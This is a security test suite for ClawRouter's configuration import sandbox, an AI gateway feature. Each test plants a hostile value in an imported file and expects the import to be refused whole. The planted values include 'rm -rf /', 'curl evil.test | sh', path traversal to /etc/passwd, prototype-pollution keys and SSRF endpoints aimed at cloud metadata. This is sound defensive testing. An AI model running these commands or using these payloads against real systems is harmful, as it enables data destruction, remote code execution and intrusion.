/*
 * ClawRouter - Self-hosted AI gateway and control platform
 * https://github.com/iant89/ClawRouter
 *
 * Copyright (C) 2026 Ian Thomas
 * SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU Affero General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option) any
 * later version. This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License
 * in the LICENSE file for more details.
 */

// SEC-017 (with SEC-001 and SEC-003): the configuration import sandbox. An imported file is
// untrusted input: it is checked as a whole before anything is applied, and refused as a
// whole when anything is wrong. Nothing in it is a path or a command, secrets are never
// imported, and no import grants more than the importer holds.

import { describe, expect, test } from 'bun:test';
import { parseDocument } from '@clawrouter/configuration';
import { PERMISSIONS, type ApiErrorBody, type ApiSuccess, type ConfigurationDocument, type ImportPlan, type ImportResult } from '@clawrouter/shared';
import { createHarness, type Harness } from '../../support/harness.ts';

const data = async <T>(res: Response) => ((await res.json()) as ApiSuccess<T>).data;
const actor = { id: 'u1', username: 'admin' };
const client = { ip: null };

/** A full export: a provider with a key, a model, an alias, rate limits, a custom role, mail and settings. */
async function exported(): Promise<ConfigurationDocument> {
  const h = createHarness();
  const admin = await h.completeSetup();
  const p = await h.providers.create(actor, { name: 'Public', identifier: 'public', kind: 'openai_compatible', endpoint: 'https://api.example.test/v1', apiKey: 'sk-import-canary-0123456789' }, client);
  h.models.create(actor, { providerId: p.id, providerModelId: 'chat-1', capabilities: ['CHAT'] }, client);
  h.routing.update(actor, { version: h.routing.get().version, defaultPolicy: h.routing.get().defaultPolicy, aliases: [{ name: 'fast', description: 'line one\nline two', enabled: true, capabilities: [], targets: [{ modelRef: 'public/chat-1', priority: 0, weight: 1 }], policy: null }] }, client);
  h.authz.createRole({ id: 'u1', username: 'admin' }, { name: 'Auditors', description: '', permissions: ['audit.read', 'logs.read'] }, client);
  await h.request('/api/settings/mail', { method: 'PUT', cookie: admin, json: { host: 'smtp.example.test', port: 587, security: 'starttls', username: 'ada', from: 'cr@example.test', password: 'mail-canary-pass' } });
  await h.request('/api/settings', { method: 'PUT', cookie: admin, json: { values: { keyMaxLifetimeDays: 14 } } });
  return data<ConfigurationDocument>(await h.request('/api/configuration/export', { cookie: admin }));
}

/** A fresh server, and what an import of `body` answers there. */
async function importInto(body: unknown, raw?: string): Promise<{ t: Harness; res: Response }> {
  const t = createHarness();
  const admin = await t.completeSetup();
  const res = raw === undefined
    ? await t.request('/api/configuration/import', { method: 'POST', cookie: admin, json: body })
    : await t.request('/api/configuration/import', { method: 'POST', cookie: admin, body: raw, headers: { 'content-type': 'application/json' } });
  return { t, res };
}

/** Refused as a whole: 400 naming `path`, and the server is exactly as before. */
async function refused(body: unknown, path: string | RegExp, raw?: string) {
  const { t, res } = await importInto(body, raw);
  const text = await res.clone().text();
  expect([res.status, text]).toEqual([400, expect.any(String)]);
  const issues = ((await res.json()) as ApiErrorBody).error.details?.issues as { path: string; message: string }[];
  expect(issues.map((i) => i.path).some((p) => (typeof path === 'string' ? p === path : path.test(p)))).toBe(true);
  expect(t.providers.list()).toEqual([]);
  expect(t.models.listAll()).toEqual([]);
  expect(t.routing.get().aliases).toEqual([]);
  expect(t.authz.listRoles().filter((r) => !r.builtIn)).toEqual([]);
  expect(t.mail.get().host).toBe('');
  expect(t.settings.list().filter((s) => s.overridden)).toEqual([]);
  return { issues, text };
}

const clone = (d: ConfigurationDocument) => structuredClone(d) as ConfigurationDocument & Record<string, unknown>;

describe('a real export imports cleanly (SEC-017)', () => {
  test('everything is created on a fresh server', async () => {
    const doc = await exported();
    const { t, res } = await importInto(doc);
    expect(res.status).toBe(200);
    expect((await data<ImportResult>(res)).failed).toBeNull();
    expect(t.providers.list().map((p) => p.identifier)).toEqual(['public']);
    expect(t.routing.get().aliases.map((a) => a.name)).toEqual(['fast']);
    expect(t.authz.listRoles().find((r) => r.name === 'Auditors')?.permissions).toEqual(['audit.read', 'logs.read']);
    expect(t.mail.get()).toMatchObject({ host: 'smtp.example.test', passwordSet: false });
  });

  test('an older file (limits before windows, no cost or request limits) is still accepted', async () => {
    const doc = clone(await exported());
    const old = doc.rateLimits as unknown as Record<string, unknown>;
    old.perKey = { requestsPerMinute: 60, tokensPerMinute: null };
    delete old.costLimits;
    delete old.requestLimits;
    expect(parseDocument(doc).rateLimits.perKey).toMatchObject({ window: 'minute', requests: 60 });
  });
});

describe('malformed documents are refused before anything is applied (SEC-017)', () => {
  test('not a configuration file at all', async () => {
    for (const body of [null, [], 'text', 42, { format: 'something-else' }]) await refused(body, 'format');
    await refused({ format: 'clawrouter-configuration', formatVersion: 2 }, 'formatVersion');
  });

  test.each([
    ['a missing section', (d: ReturnType<typeof clone>) => { delete (d as Record<string, unknown>).routing; }, 'routing'],
    ['a string for a number', (d: ReturnType<typeof clone>) => { (d.providers[0] as unknown as Record<string, unknown>).priority = '1'; }, 'providers[0].priority'],
    ['a priority out of range (the provider form refuses it, imports did not)', (d: ReturnType<typeof clone>) => { d.providers[0]!.priority = 10_000_000; }, 'providers[0].priority'],
    ['a timeout out of range', (d: ReturnType<typeof clone>) => { d.providers[0]!.timeoutMs = 1; }, 'providers[0].timeoutMs'],
    ['an unknown provider kind', (d: ReturnType<typeof clone>) => { (d.providers[0] as unknown as Record<string, unknown>).kind = 'shell'; }, 'providers[0].kind'],
    ['a control character in a name', (d: ReturnType<typeof clone>) => { d.providers[0]!.name = 'Public\u0000'; }, 'providers[0].name'],
    ['an unknown capability', (d: ReturnType<typeof clone>) => { (d.models[0]!.capabilities as string[]).push('ROOT'); }, 'models[0].capabilities[1]'],
    ['a negative price', (d: ReturnType<typeof clone>) => { d.models[0]!.cost = { inputPerMTok: -1, outputPerMTok: 1 }; }, 'models[0].cost.inputPerMTok'],
    ['a rate limit of zero', (d: ReturnType<typeof clone>) => { d.rateLimits.perKey.requests = 0; }, 'rateLimits.perKey.requests'],
    ['a request limit out of range', (d: ReturnType<typeof clone>) => { d.rateLimits.requestLimits!.maxJsonDepth = 100_000; }, 'rateLimits.requestLimits.maxJsonDepth'],
    ['a setting out of range', (d: ReturnType<typeof clone>) => { (d.settings.system as Record<string, number>).keyMaxLifetimeDays = 0; }, 'settings.system.keyMaxLifetimeDays'],
    ['an unknown setting', (d: ReturnType<typeof clone>) => { (d.settings.system as Record<string, number>).allowEverything = 1; }, 'settings.system.allowEverything'],
    ['a bad sender address', (d: ReturnType<typeof clone>) => { d.settings.mail.from = 'not an address'; }, 'settings.mail.from'],
    ['two providers with one identifier', (d: ReturnType<typeof clone>) => { d.providers.push({ ...d.providers[0]!, name: 'Other' }); }, 'providers[1].identifier'],
    ['two roles with one name', (d: ReturnType<typeof clone>) => { d.roles.push({ ...d.roles[0]!, name: 'AUDITORS' }); }, 'roles[1].name'],
    ['an alias aimed at a model that exists nowhere', (d: ReturnType<typeof clone>) => { d.routing.aliases[0]!.targets[0]!.modelRef = 'public/missing'; }, 'routing.aliases[0].targets[0].modelRef'],
    ['too many providers', (d: ReturnType<typeof clone>) => { d.providers = Array.from({ length: 1001 }, (_, i) => ({ ...d.providers[0]!, identifier: `p${i}`, name: `P${i}` })); }, 'providers'],
  ])('%s', async (_name, change, path) => {
    const doc = clone(await exported());
    change(doc);
    await refused(doc, path);
  });

  test('a valid part is not applied when another part is invalid (nothing is half imported)', async () => {
    const doc = clone(await exported());
    doc.settings.signIn = { methods: { totp: false, email: false }, require: 'everyone' };
    await refused(doc, 'settings.signIn.require');
  });
});

describe('unknown and security-sensitive fields (SEC-017, SEC-016)', () => {
  test('secrets are never imported: a provider key or a mail password is refused, and not repeated', async () => {
    const doc = clone(await exported());
    (doc.providers[0] as unknown as Record<string, unknown>).apiKey = 'sk-planted-0123456789abcdef';
    (doc.settings.mail as unknown as Record<string, unknown>).password = 'planted-mail-password';
    const { issues, text } = await refused(doc, 'providers[0].apiKey');
    expect(issues.find((i) => i.path === 'settings.mail.password')?.message).toMatch(/secret/);
    expect(text).not.toContain('planted');
  });

  test.each([
    ['a top-level path', { backupPath: '../../etc/passwd' }, 'backupPath'],
    ['a command on a provider', { providers: 0, field: 'command', value: 'rm -rf /' }, 'providers[0].command'],
    ['a hook on a model', { models: 0, field: 'onImport', value: 'curl evil.test | sh' }, 'models[0].onImport'],
    ['a credential on a role', { roles: 0, field: 'credentials', value: { token: 'x' } }, 'roles[0].credentials'],
    ['a key on the settings', { settings: true, field: 'secretKey', value: 'x' }, 'settings.secretKey'],
    ['an extra field in a rate limit', { limits: true, field: 'exec', value: 'id' }, 'rateLimits.perKey.exec'],
  ])('%s is refused', async (_name, what, path) => {
    const doc = clone(await exported());
    const w = what as Record<string, unknown>;
    if ('backupPath' in w) doc.backupPath = w.backupPath;
    else if ('providers' in w) (doc.providers[0] as unknown as Record<string, unknown>)[w.field as string] = w.value;
    else if ('models' in w) (doc.models[0] as unknown as Record<string, unknown>)[w.field as string] = w.value;
    else if ('roles' in w) (doc.roles[0] as unknown as Record<string, unknown>)[w.field as string] = w.value;
    else if ('settings' in w) (doc.settings as unknown as Record<string, unknown>)[w.field as string] = w.value;
    else (doc.rateLimits.perKey as unknown as Record<string, unknown>)[w.field as string] = w.value;
    await refused(doc, path);
  });

  test('prototype keys are refused anywhere', async () => {
    const doc = await exported();
    const text = JSON.stringify(doc);
    await refused(null, '__proto__', text.replace('{"format"', '{"__proto__":{"admin":true},"format"'));
    await refused(null, 'providers[0].constructor', text.replace('"identifier":"public"', '"constructor":{"prototype":{}},"identifier":"public"'));
    expect(({} as Record<string, unknown>).admin).toBeUndefined();
  });

  test('identifiers cannot carry path traversal', async () => {
    const doc = clone(await exported());
    doc.providers[0]!.identifier = '../../etc';
    await refused(doc, 'providers[0].identifier');
  });
});

describe('URLs (SEC-017, SEC-001)', () => {
  test.each([
    'http://169.254.169.254/latest/meta-data',
    'https://metadata.google.internal/v1',
    'https://192.168.1.10/v1',
    'https://[::ffff:192.168.0.1]/v1',
    'https://user:pass@api.example.test/v1',
    'file:///etc/passwd',
    'javascript:alert(1)',
    'https://api.example.test/v1?x=1',
  ])('a provider endpoint the URL rules or the outbound policy refuse (%s) is refused up front', async (endpoint) => {
    const doc = clone(await exported());
    doc.providers[0]!.endpoint = endpoint;
    const { text } = await refused(doc, 'providers[0].endpoint');
    expect(text).not.toContain('pass@');
  });

  test('plain http to a public name still fails when applied (it is looked up then), and creates nothing', async () => {
    const doc = clone(await exported());
    doc.providers[0]!.endpoint = 'http://api.example.test/v1';
    const { t, res } = await importInto(doc);
    expect((await data<ImportResult>(res)).failed?.message ?? '').toMatch(/not allowed|endpoint/i);
    expect(t.providers.list()).toEqual([]);
  });
});

describe('roles and permissions: no escalation (SEC-017)', () => {
  test('unknown permissions are refused', async () => {
    const doc = clone(await exported());
    (doc.roles[0]!.permissions as string[]).push('root.everything');
    await refused(doc, 'roles[0].permissions[2]');
  });

  test('a role that would hold every permission cannot be imported (only Administrator may)', async () => {
    const doc = clone(await exported());
    doc.roles.push({ name: 'Shadow admin', description: 'every permission', permissions: [...PERMISSIONS] });
    await refused(doc, 'roles[1].permissions');
  });

  test('changing an existing role needs the permissions it has now, not only the new ones', async () => {
    const t = createHarness();
    await t.completeSetup();
    t.authz.createRole(actor, { name: 'Builders', description: '', permissions: ['providers.write', 'providers.read'] }, client);
    const importer = { id: 'imp', username: 'importer', permissions: new Set<string>(['settings.read', 'settings.write', 'roles.read', 'roles.write', 'providers.read', 'models.read', 'routing.read', 'rate_limits.read']) };
    const doc = clone(await exported());
    doc.roles = [{ name: 'Builders', description: 'read only now', permissions: ['providers.read'] }];
    const planned: ImportPlan = t.configuration.plan(importer, doc);
    expect(planned.missingPermissions).toContain('providers.write');
    await expect(t.configuration.apply(importer, doc, client)).rejects.toThrow(/providers.write/);
    expect(t.authz.listRoles().find((r) => r.name === 'Builders')?.permissions).toContain('providers.write');
  });

  test('built-in roles are never changed by an import', async () => {
    const doc = clone(await exported());
    doc.roles.push({ name: 'Viewer', description: 'more', permissions: ['users.write'] });
    const { t, res } = await importInto(doc);
    expect((await data<ImportResult>(res)).changes.find((c) => c.name === 'Viewer')?.action).toBe('skipped');
    expect(t.authz.listRoles().find((r) => r.name === 'Viewer')?.permissions).not.toContain('users.write');
  });

  test('the service checks the document itself too (callers that skip the API get the sandbox)', async () => {
    const t = createHarness();
    await t.completeSetup();
    const doc = clone(await exported());
    (doc.settings.mail as unknown as Record<string, unknown>).password = 'planted';
    const all = { id: 'a', username: 'a', permissions: new Set<string>(PERMISSIONS) };
    expect(() => t.configuration.plan(all, doc)).toThrow();
    await expect(t.configuration.apply(all, doc, client)).rejects.toThrow();
    expect(t.mail.get().passwordSet).toBe(false);
  });
});

describe('exports (SEC-016)', () => {
  test('an export never carries a stored secret', async () => {
    const doc = JSON.stringify(await exported());
    expect(doc).not.toContain('sk-import-canary');
    expect(doc).not.toContain('mail-canary-pass');
    expect(doc).not.toMatch(/"(apiKey|password|secret|ciphertext|passwordCiphertext)"/);
  });

  test('every field of an export is classified, and none is protected', async () => {
    const { classifyConfigurationPath, isProtectedClass } = await import('@clawrouter/shared');
    const paths: string[] = [];
    const walk = (v: unknown, p: string) => {
      if (Array.isArray(v)) v.forEach((x, i) => walk(x, `${p}[${i}]`));
      else if (typeof v === 'object' && v !== null) for (const [k, x] of Object.entries(v)) walk(x, p ? `${p}.${k}` : k);
      else paths.push(p);
    };
    walk(await exported(), '');
    expect(paths.length).toBeGreaterThan(50);
    for (const p of paths) {
      const c = classifyConfigurationPath(p);
      expect([p, c !== null && !isProtectedClass(c)]).toEqual([p, true]);
    }
  });
});
